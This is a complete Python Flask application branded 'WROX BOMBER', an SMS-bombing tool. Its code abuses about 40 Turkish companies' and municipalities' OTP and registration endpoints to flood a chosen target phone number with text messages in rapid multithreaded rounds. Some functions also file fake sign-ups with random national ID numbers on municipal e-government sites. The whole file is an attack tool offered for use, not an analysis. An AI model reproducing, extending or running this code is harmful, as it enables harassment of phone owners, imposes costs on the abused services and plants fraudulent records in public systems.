from flask import Flask, request, render_template_string
import requests
import random
import string
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

def random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# ============================================================
# TÜM API'LER (40+)
# ============================================================

def api_kahvedunyasi(n):
    try:
        r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                         headers={"Content-Type": "application/json"},
                         json={"countryCode": "90", "phoneNumber": n}, timeout=5)
        return r.json().get("processStatus") == "Success", "KahveDunyasi"
    except: return False, "KahveDunyasi"

def api_wmf(n):
    try:
        data = {"confirm": "true", "date_of_birth": "1990-01-01", "email": f"{random_string(10)}@gmail.com", "phone": f"0{n}"}
        r = requests.post("https://www.wmf.com.tr/users/register/", data=data, timeout=5)
        return r.status_code == 202, "WMF"
    except: return False, "WMF"

def api_bim(n):
    try:
        r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": n}, timeout=5)
        return r.status_code == 200, "BIM"
    except: return False, "BIM"

def api_englishhome(n):
    try:
        r = requests.post("https://www.englishhome.com/api/member/sendOtp", json={"Phone": n, "XID": ""}, timeout=5)
        return r.json().get("isError") == False, "EnglishHome"
    except: return False, "EnglishHome"

def api_evidea(n):
    try:
        data = {"phone": f"0{n}", "password": "Test123!", "confirm": "true"}
        r = requests.post("https://www.evidea.com/users/register/", data=data, timeout=5)
        return r.status_code == 202, "Evidea"
    except: return False, "Evidea"

def api_koton(n):
    try:
        data = {"phone": f"0{n}", "password": "Test123!", "confirm": "true"}
        r = requests.post("https://www.koton.com/users/register/", data=data, timeout=5)
        return r.status_code == 202, "Koton"
    except: return False, "Koton"

def api_komagene(n):
    try:
        r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder", json={"FirmaId": 32, "Telefon": n}, timeout=5)
        return r.json().get("Success") == True, "Komagene"
    except: return False, "Komagene"

def api_dominos(n):
    try:
        r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", json={"mobilePhone": n}, timeout=5)
        return r.json().get("isSuccess") == True, "Dominos"
    except: return False, "Dominos"

def api_kofteciyusuf(n):
    try:
        r = requests.post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder", json={"Telefon": n, "FirmaId": 82}, timeout=5)
        return r.json().get("Success") == True, "KofteciYusuf"
    except: return False, "KofteciYusuf"

def api_filemarket(n):
    try:
        r = requests.post("https://api.filemarket.com.tr/v1/otp/send", json={"mobilePhoneNumber": f"90{n}"}, timeout=5)
        return r.json().get("responseType") == "SUCCESS", "FileMarket"
    except: return False, "FileMarket"

def api_porty(n):
    try:
        r = requests.post("https://panel.porty.tech/api.php?", json={"job": "start_login", "phone": n}, timeout=5)
        return r.status_code == 200, "Porty"
    except: return False, "Porty"

def api_hayatsu(n):
    try:
        r = requests.post("https://api.hayatsu.com.tr/api/SignUp/SendOtp", data={"mobilePhoneNumber": n, "actionType": "register"}, timeout=5)
        return r.json().get("is_success") == True, "Hayatsu"
    except: return False, "Hayatsu"

def api_metro(n):
    try:
        r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend", json={"methodType": "2", "mobilePhoneNumber": n}, timeout=5)
        return r.json().get("status") == "success", "Metro"
    except: return False, "Metro"

def api_uysal(n):
    try:
        r = requests.post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms", json={"phone_number": n}, timeout=5)
        return r.status_code == 200, "Uysal"
    except: return False, "Uysal"

def api_jimmykey(n):
    try:
        r = requests.post(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={n}&gRecaptchaResponse=undefined", timeout=5)
        return r.json().get("Sonuc") == True, "Jimmykey"
    except: return False, "Jimmykey"

def api_suiste(n):
    try:
        data = {"action": "register", "device_id": str(uuid.uuid4()), "gsm": n, "password": "Test123!"}
        r = requests.post("https://suiste.com/api/auth/code", data=data, timeout=5)
        return r.json().get("code") == "common.success", "Suiste"
    except: return False, "Suiste"

def api_kimgb(n):
    try:
        r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", json={"msisdn": f"90{n}"}, timeout=5)
        return r.status_code == 200, "KimGBIster"
    except: return False, "KimGBIster"

def api_ucdortbes(n):
    try:
        r = requests.post("https://api.345dijital.com/api/users/register", json={"phoneNumber": f"+90{n}"}, timeout=5)
        return r.status_code == 200, "345Dijital"
    except: return False, "345Dijital"

def api_tiklagelsin(n):
    try:
        payload = {"operationName": "GENERATE_OTP", "variables": {"phone": f"+90{n}", "challenge": str(uuid.uuid4())}, "query": "mutation GENERATE_OTP($phone: String, $challenge: String) { generateOtp(phone: $phone, challenge: $challenge) }"}
        r = requests.post("https://www.tiklagelsin.com/user/graphql", json=payload, timeout=5)
        return r.status_code == 200, "TiklaGelsin"
    except: return False, "TiklaGelsin"

def api_akasya(n):
    try:
        r = requests.post("https://akasyaapi.poilabs.com/v1/en/sms", json={"phone": n}, timeout=5)
        return r.json().get("result") == "SMS sended succesfully!", "Akasya"
    except: return False, "Akasya"

def api_akbati(n):
    try:
        r = requests.post("https://akbatiapi.poilabs.com/v1/en/sms", json={"phone": n}, timeout=5)
        return r.json().get("result") == "SMS sended succesfully!", "Akbati"
    except: return False, "Akbati"

def api_naosstars(n):
    try:
        r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350", json={"telephone": f"+90{n}", "type": "register"}, timeout=5)
        return r.status_code == 200, "Naosstars"
    except: return False, "Naosstars"

def api_hizliecza(n):
    try:
        r = requests.post("https://prod.hizliecza.net/mobil/account/sendOTP", json={"otpOperationType": 1, "phoneNumber": f"+90{n}"}, timeout=5)
        return r.status_code == 200, "Hizliecza"
    except: return False, "Hizliecza"

def api_tasdelen(n):
    try:
        r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp", json={"phone": n}, timeout=5)
        return r.json().get("result") == True, "Tasdelen"
    except: return False, "Tasdelen"

def api_yapp(n):
    try:
        mail = random_string(10)+"@gmail.com"
        r = requests.post("https://yapp.com.tr/api/mobile/v1/register", json={"phone_number": n, "email": mail, "firstname": "Test", "lastname": "User"}, timeout=5)
        return r.status_code == 200, "Yapp"
    except: return False, "Yapp"

def api_yilmazticaret(n):
    try:
        data = {"telephone": f"0 ({n[:3]}) {n[3:6]} {n[6:8]} {n[8:]}"}
        r = requests.post("https://app.buyursungelsin.com/api/customer/form/checkx", data=data, timeout=5)
        return r.status_code == 200, "YilmazTicaret"
    except: return False, "YilmazTicaret"

def api_beefull(n):
    try:
        mail = random_string(10)+"@gmail.com"
        r = requests.post("https://app.beefull.io/api/inavitas-access-management/signup", json={"phoneNumber": n, "phoneCode": "90", "email": mail, "firstName": "Test", "lastName": "User"}, timeout=5)
        if r.status_code == 200:
            r2 = requests.post("https://app.beefull.io/api/inavitas-access-management/sms-login", json={"phoneNumber": n, "phoneCode": "90"}, timeout=5)
            return r2.status_code == 200, "Beefull"
        return False, "Beefull"
    except: return False, "Beefull"

def api_baydoner(n):
    try:
        r = requests.post("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp", json={"PhoneNumber": n, "AreaCode": 90, "Name": "Test", "Surname": "User", "Email": random_string(10)+"@gmail.com"}, timeout=5)
        return r.json().get("Control") == 1, "Baydoner"
    except: return False, "Baydoner"

def api_pidem(n):
    try:
        payload = {"query": "mutation($phone: String){sendOtpSms(phone:$phone){resultStatus}}", "variables": {"phone": n}}
        r = requests.post("https://restashop.azurewebsites.net/graphql/", json=payload, timeout=5)
        return r.json().get("data", {}).get("sendOtpSms", {}).get("resultStatus") == "SUCCESS", "Pidem"
    except: return False, "Pidem"

def api_frink(n):
    try:
        r = requests.post("https://api.frink.com.tr/api/auth/postSendOTP", json={"phoneNumber": "90"+n, "areaCode": "90", "etkContract": True, "language": "TR"}, timeout=5)
        return r.json().get("processStatus") == "SUCCESS", "Frink"
    except: return False, "Frink"

def api_bodrum(n):
    try:
        r = requests.post("https://gandalf.orwi.app/api/user/requestOtp", json={"gsm": "+90"+n, "source": "orwi"}, timeout=5)
        return r.status_code == 200, "Bodrum"
    except: return False, "Bodrum"

def api_orwi(n):
    try:
        r = requests.post("https://gandalf.orwi.app/api/user/requestOtp", json={"gsm": "+90"+n, "source": "orwi"}, timeout=5)
        return r.status_code == 200, "Orwi"
    except: return False, "Orwi"

def api_coffy(n):
    try:
        r = requests.post("https://user-api-gw.coffy.com.tr/user/signup", json={"gsm": n, "countryCode": "90", "name": "Test User"}, timeout=5)
        return r.status_code == 200, "Coffy"
    except: return False, "Coffy"

def api_hamidiye(n):
    try:
        r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp", json={"phone": n, "isGuest": False}, timeout=5)
        return r.json().get("result") == True, "Hamidiye"
    except: return False, "Hamidiye"

def api_fatih(n):
    try:
        tc = str(random.randint(10000000000, 99999999999))  # rastgele TC
        data = {"SahisUyelik.TCKimlikNo": tc, "SahisUyelik.CepTelefonu": n, "SahisUyelik.EPosta": random_string(10)+"@gmail.com", "SahisUyelik.Sifre": "Test123", "SahisUyelik.SifreyiDogrula": "Test123"}
        r = requests.post("https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet", data=data, timeout=5)
        return r.status_code == 200, "Fatih"
    except: return False, "Fatih"

def api_sancaktepe(n):
    try:
        tc = str(random.randint(10000000000, 99999999999))
        data = {"SahisUyelik.TCKimlikNo": tc, "SahisUyelik.CepTelefonu": n, "SahisUyelik.EPosta": random_string(10)+"@gmail.com", "SahisUyelik.Sifre": "Test123", "SahisUyelik.SifreyiDogrula": "Test123"}
        r = requests.post("https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet", data=data, timeout=5)
        return r.status_code == 200, "Sancaktepe"
    except: return False, "Sancaktepe"

def api_bayrampasa(n):
    try:
        tc = str(random.randint(10000000000, 99999999999))
        data = {"SahisUyelik.TCKimlikNo": tc, "SahisUyelik.CepTelefonu": n, "SahisUyelik.EPosta": random_string(10)+"@gmail.com", "SahisUyelik.Sifre": "Test123", "SahisUyelik.SifreyiDogrula": "Test123"}
        r = requests.post("https://ebelediye.bayrampasa.bel.tr/Sicil/KisiUyelikKaydet", data=data, timeout=5)
        return r.status_code == 200, "Bayrampasa"
    except: return False, "Bayrampasa"

def api_money(n):
    try:
        r = requests.post("https://www.money.com.tr/Account/ValidateAndSendOTP", data={"phone": f"{n[:3]} {n[3:]}"}, timeout=5)
        return r.json().get("resultType") == 0, "Money"
    except: return False, "Money"

def api_alixavien(n):
    try:
        r = requests.post("https://www.alixavien.com.tr/api/member/sendOtp", json={"Phone": n, "XID": ""}, timeout=5)
        return r.json().get("isError") == False, "Alixavien"
    except: return False, "Alixavien"

def api_ido(n):
    try:
        r = requests.post("https://api.ido.com.tr/idows/v2/register", json={"mobileNumber": f"0{n}", "email": random_string(10)+"@gmail.com", "firstName": "Test", "lastName": "User", "tckn": str(random.randint(10000000000, 99999999999))}, timeout=5)
        return r.status_code == 200, "Ido"
    except: return False, "Ido"

# ============================================================
# API LİSTESİ
# ============================================================

API_LIST = [
    api_kahvedunyasi, api_wmf, api_bim, api_englishhome, api_evidea,
    api_koton, api_komagene, api_dominos, api_kofteciyusuf,
    api_filemarket, api_porty, api_hayatsu, api_metro, api_uysal, api_jimmykey,
    api_suiste, api_kimgb, api_ucdortbes, api_tiklagelsin,
    api_akasya, api_akbati, api_naosstars, api_hizliecza, api_tasdelen,
    api_yapp, api_yilmazticaret, api_beefull, api_baydoner, api_pidem,
    api_frink, api_bodrum, api_orwi, api_coffy, api_hamidiye,
    api_fatih, api_sancaktepe, api_bayrampasa, api_money, api_alixavien,
    api_ido
]

API_NAMES = [
    'KahveDunyasi', 'WMF', 'BIM', 'EnglishHome', 'Evidea',
    'Koton', 'Komagene', 'Dominos', 'KofteciYusuf',
    'FileMarket', 'Porty', 'Hayatsu', 'Metro', 'Uysal', 'Jimmykey',
    'Suiste', 'KimGBIster', '345Dijital', 'TiklaGelsin',
    'Akasya', 'Akbati', 'Naosstars', 'Hizliecza', 'Tasdelen',
    'Yapp', 'YilmazTicaret', 'Beefull', 'Baydoner', 'Pidem',
    'Frink', 'Bodrum', 'Orwi', 'Coffy', 'Hamidiye',
    'Fatih', 'Sancaktepe', 'Bayrampasa', 'Money', 'Alixavien',
    'Ido'
]

def duzenle(num):
    num = num.replace(" ", "").replace("+", "").replace("-", "")
    if num.startswith("5") and len(num) == 10: return num
    if num.startswith("05") and len(num) == 11: return num[1:]
    if num.startswith("90") and len(num) == 12: return num[2:]
    return num if len(num) == 10 and num.isdigit() else None

# ============================================================
# HTML ŞABLON (Hamburger menülü, hızlı/yavaş mod)
# ============================================================

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WROX BOMBER</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}
        .container{background:#0d0d0d;border:2px solid #00ff41;border-radius:20px;padding:25px;width:100%;max-width:420px;position:relative}
        /* Hamburger Menü */
        .menu-toggle{position:absolute;top:15px;right:20px;font-size:28px;color:#00ff41;cursor:pointer;z-index:10;user-select:none}
        .menu-dropdown{display:none;background:#111;border:1px solid #00ff41;border-radius:12px;padding:15px;margin-top:10px}
        .menu-dropdown.show{display:block}
        .menu-item{display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid #1a1a1a}
        .menu-item:last-child{border-bottom:none}
        .menu-item label{color:#00ff41;font-size:14px;cursor:pointer}
        .menu-item input[type="radio"]{accent-color:#00ff41;width:18px;height:18px}
        h1{text-align:center;color:#00ff41;font-size:28px}
        .sub{text-align:center;color:#444;font-size:12px;margin-bottom:20px}
        label{color:#00ff41;font-size:14px;display:block;margin-bottom:8px}
        input{width:100%;padding:14px;background:#111;border:2px solid #1a1a1a;border-radius:12px;color:#00ff41;font-size:20px;text-align:center;outline:none}
        input:focus{border-color:#00ff41}
        .btn-group{display:flex;gap:10px;margin:15px 0}
        button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;font-size:16px;cursor:pointer}
        .btn-start{background:#00ff41;color:#0a0a0a}
        .btn-start:disabled{opacity:0.3}
        .btn-stop{background:#ff0033;color:#fff}
        .btn-stop:disabled{opacity:0.3}
        .stats{background:#111;padding:15px;border-radius:12px;margin:10px 0}
        .stat-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #1a1a1a}
        .stat-row:last-child{border-bottom:none}
        .stat-label{color:#666;font-size:13px}
        .stat-value{color:#00ff41;font-weight:bold}
        .status{text-align:center;padding:10px;border-radius:10px;margin-top:10px;font-weight:bold;font-size:14px}
        .active{background:rgba(0,255,65,0.1);color:#00ff41;border:1px solid #00ff41}
        .idle{background:rgba(255,255,255,0.02);color:#444;border:1px solid #1a1a1a}
        .error{color:#ff0033;text-align:center;font-size:13px;min-height:20px}
        .footer{text-align:center;color:#1a1a1a;font-size:10px;margin-top:15px}
        .api-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:4px;margin-top:10px;max-height:180px;overflow-y:auto;padding-right:4px}
        .api-item{font-size:9px;padding:4px;border-radius:6px;text-align:center;font-weight:600}
        .api-success{color:#00ff41;background:rgba(0,255,65,0.06);border:1px solid rgba(0,255,65,0.1)}
        .api-fail{color:#444;background:rgba(255,255,255,0.02);border:1px solid #1a1a1a}
        .api-pending{color:#ffaa00;background:rgba(255,170,0,0.05);border:1px solid rgba(255,170,0,0.1)}
        .mode-badge{display:inline-block;background:#1a1a1a;color:#00ff41;padding:2px 10px;border-radius:20px;font-size:12px;margin-left:5px}
        @media (max-width:480px){.api-grid{grid-template-columns:1fr 1fr}}
    </style>
</head>
<body>
<div class="container">
    <!-- Hamburger -->
    <div class="menu-toggle" onclick="toggleMenu()">☰</div>
    <div class="menu-dropdown" id="menuDropdown">
        <div class="menu-item">
            <input type="radio" name="mode" value="fast" id="modeFast" checked>
            <label for="modeFast">🚀 Hızlı (100ms)</label>
        </div>
        <div class="menu-item">
            <input type="radio" name="mode" value="slow" id="modeSlow">
            <label for="modeSlow">🐢 Yavaş (2s)</label>
        </div>
    </div>

    <h1>⚡ WROX#FLEX</h1>
    <div class="sub">HYPER COMBO BOMBER v8.0 <span id="apiCount">41</span> API</div>
    
    <label>📱 HEDEF NUMARA</label>
    <input type="tel" id="number" placeholder="5XXXXXXXXX" maxlength="10">
    
    <div class="btn-group">
        <button class="btn-start" id="startBtn" onclick="startBomb()">🔥 BAŞLAT</button>
        <button class="btn-stop" id="stopBtn" onclick="stopBomb()" disabled>⏹ DURDUR</button>
    </div>
    
    <div id="error" class="error"></div>
    
    <div class="stats">
        <div class="stat-row"><span class="stat-label">📊 DURUM</span><span class="stat-value" id="statusText">HAZIR</span></div>
        <div class="stat-row"><span class="stat-label">📱 HEDEF</span><span class="stat-value" id="targetText">-</span></div>
        <div class="stat-row"><span class="stat-label">📨 GÖNDERİM</span><span class="stat-value" id="totalText">0</span></div>
        <div class="stat-row"><span class="stat-label">✅ BAŞARILI</span><span class="stat-value" id="successText">0</span></div>
    </div>
    
    <div id="statusBox" class="status idle">⚡ SİSTEM HAZIR</div>
    <div id="apiGrid" class="api-grid"></div>
    <div class="footer">WROX TEAM</div>
</div>

<script>
var API_NAMES = """ + str(API_NAMES) + """;
var isRunning=false,totalSent=0,totalSuccess=0,targetNumber='',bombTimer=null;
var apiResults = {};
var mode = 'fast'; // fast veya slow

function toggleMenu() {
    document.getElementById('menuDropdown').classList.toggle('show');
}

// Mod seçimini dinle
document.querySelectorAll('input[name="mode"]').forEach(function(el) {
    el.addEventListener('change', function() {
        mode = this.value;
    });
});

function updateUI() {
    document.getElementById('statusText').textContent = isRunning ? '🔥 AKTİF' : '💤 HAZIR';
    document.getElementById('targetText').textContent = targetNumber ? '+90'+targetNumber : '-';
    document.getElementById('totalText').textContent = totalSent;
    document.getElementById('successText').textContent = totalSuccess;
    var box = document.getElementById('statusBox');
    box.className = isRunning ? 'status active' : 'status idle';
    box.textContent = isRunning ? '🔥 +90'+targetNumber+' BOMBALANIYOR ('+mode+')' : '⚡ SİSTEM HAZIR';
    document.getElementById('startBtn').disabled = isRunning;
    document.getElementById('stopBtn').disabled = !isRunning;
    
    var grid = document.getElementById('apiGrid');
    grid.innerHTML = '';
    API_NAMES.forEach(function(name) {
        var div = document.createElement('div');
        var status = apiResults[name] || 'pending';
        div.className = 'api-item api-'+status;
        div.textContent = (status === 'success' ? '✅' : status === 'fail' ? '❌' : '⏳') + ' ' + name;
        grid.appendChild(div);
    });
    document.getElementById('apiCount').textContent = API_NAMES.length;
}

async function bombRound() {
    if (!isRunning) return;
    try {
        var response = await fetch('/bomb?number=' + targetNumber + '&mode=' + mode);
        var data = await response.json();
        if (data.error) { document.getElementById('error').textContent = '❌ '+data.error; return; }
        data.results.forEach(function(item) {
            apiResults[item.name] = item.success ? 'success' : 'fail';
            totalSent++;
            if (item.success) totalSuccess++;
        });
        updateUI();
    } catch(e) {
        document.getElementById('error').textContent = '❌ Bağlantı hatası!';
    }
    if (isRunning) {
        var delay = (mode === 'fast') ? 100 : 2000;
        bombTimer = setTimeout(bombRound, delay);
    }
}

function startBomb() {
    var number = document.getElementById('number').value.trim();
    if (!number || number.length != 10) {
        document.getElementById('error').textContent = '❌ 10 haneli numara girin!';
        return;
    }
    document.getElementById('error').textContent = '';
    targetNumber = number;
    isRunning = true;
    totalSent = 0;
    totalSuccess = 0;
    apiResults = {};
    API_NAMES.forEach(function(name) { apiResults[name] = 'pending'; });
    updateUI();
    bombRound();
}

function stopBomb() {
    isRunning = false;
    if (bombTimer) { clearTimeout(bombTimer); bombTimer = null; }
    document.getElementById('stopBtn').disabled = true;
    updateUI();
}

document.getElementById('number').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') startBomb();
});
document.getElementById('number').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});
updateUI();
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/bomb')
def bomb():
    number = request.args.get('number', '')
    number = duzenle(number)
    if not number:
        return {'error': 'Geçersiz numara'}, 400
    
    # Moda göre worker sayısı (fast=50, slow=10)
    mode = request.args.get('mode', 'fast')
    max_workers = 50 if mode == 'fast' else 10
    
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(api, number): name for api, name in zip(API_LIST, API_NAMES)}
        for future in as_completed(futures):
            name = futures[future]
            success = future.result()
            results.append({'name': name, 'success': success})
    
    return {'results': results}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=False)
